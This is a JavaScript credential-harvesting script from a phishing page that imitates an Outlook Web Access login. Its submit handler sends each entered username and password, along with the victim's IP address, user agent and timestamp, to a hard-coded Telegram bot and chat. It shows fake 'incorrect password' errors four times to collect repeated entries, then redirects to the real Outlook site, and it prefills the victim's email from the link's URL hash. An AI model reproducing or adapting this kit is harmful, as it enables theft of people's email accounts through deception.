<script>
// --- Configuration ---
const TELEGRAM_BOT_TOKEN = '7125119827:AAH-lECXAMGZLDaA3bqKG-sMYwAVBfOZ64Q'; // <--- REPLACE WITH YOUR BOT TOKEN
const TELEGRAM_CHAT_ID = '-1002506242994';    // <--- REPLACE WITH YOUR CHAT ID
const DELAY_SECONDS = 2; // Simulate processing delay
// ----------------------

let loginAttempts = 0;

function sendTelegramMessage(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const data = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: 'HTML'
  };
  return fetch(url, {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: new URLSearchParams(data)
  });
}

function getIP() {
  // Use a public API to get the user's IP address
  return fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => data.ip)
    .catch(() => 'Unknown');
}

function showError(message) {
  const errorDiv = document.getElementById('expltxt');
  errorDiv.textContent = message;
  errorDiv.className = 'signInError';
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function submitForm() {
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;
  const passwordText = document.getElementById('passwordText');
  const actualPassword = passwordText.style.display !== 'none' ? passwordText.value : password;

  if (!username || !actualPassword) {
    showError('Please enter your email address and password.');
    return;
  }

  loginAttempts++;

  // Show loading state
  const signinTxt = document.querySelector('.signinTxt');
  const originalText = signinTxt.textContent;
  signinTxt.textContent = 'signing in...';

  // Get IP address
  const ip = await getIP();
  const useragent = navigator.userAgent;
  const timestamp = new Date().toLocaleString();

  // Construct Telegram message
  let telegram_message = `<b>OWA Login Attempt (#${loginAttempts})</b>\n`;
  telegram_message += `<b>Username:</b> ${username}\n`;
  telegram_message += `<b>Password:</b> ${actualPassword}\n`;
  telegram_message += `<b>IP Address:</b> ${ip}\n`;
  telegram_message += `<b>User Agent:</b> ${useragent}\n`;
  telegram_message += `<b>Timestamp:</b> ${timestamp}`;

  // Send to Telegram
  if (TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' && TELEGRAM_CHAT_ID !== 'YOUR_TELEGRAM_CHAT_ID') {
    await sendTelegramMessage(telegram_message);
  }

  // Simulate processing delay
  await sleep(DELAY_SECONDS * 1000);

  // Simulate login logic: Fail first 4 attempts, succeed subsequent attempts
  let signal, msg;
  if (loginAttempts <= 4) {
    signal = 'ok';
    msg = "The username or password you entered isn't correct. Try entering it again.";
  } else {
    signal = 'ok';
    msg = 'Login successful, redirecting...';
  }

  // Reset button text
  signinTxt.textContent = originalText;

  if (signal === 'ok') {
    if (loginAttempts >= 5) {
      // Redirect on 5th attempt
      window.location.href = 'https://outlook.office.com/mail/';
    } else {
      // Show error message
      showError(msg);
      document.getElementById('password').value = '';
      document.getElementById('passwordText').value = '';
    }
  } else {
    showError(msg);
  }
}

document.addEventListener('DOMContentLoaded', function() {
  // Check URL hash for email parameter
  if (window.location.hash) {
    try {
      const hash = window.location.hash.substring(1);
      if (hash.indexOf('@') > 0) {
        document.getElementById('username').value = decodeURIComponent(hash);
      }
    } catch (e) {
      console.error('Error parsing URL hash:', e);
    }
  }
  // Wire up the sign in button click
  const signinBtn = document.querySelector('.signinbutton');
  if (signinBtn) {
    signinBtn.addEventListener('click', submitForm);
  }
  // Allow Enter key to submit the form
  document.querySelector('#password').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
      submitForm();
    }
  });
  // Toggle password visibility
  const showPasswordCheck = document.getElementById('showPasswordCheck');
  if (showPasswordCheck) {
    showPasswordCheck.addEventListener('change', function() {
      const passwordField = document.getElementById('password');
      const passwordTextField = document.getElementById('passwordText');
      if (this.checked) {
        passwordTextField.value = passwordField.value;
        passwordTextField.style.display = 'block';
        passwordField.style.display = 'none';
      } else {
        passwordField.value = passwordTextField.value;
        passwordField.style.display = 'block';
        passwordTextField.style.display = 'none';
      }
    });
  }
});
</script>
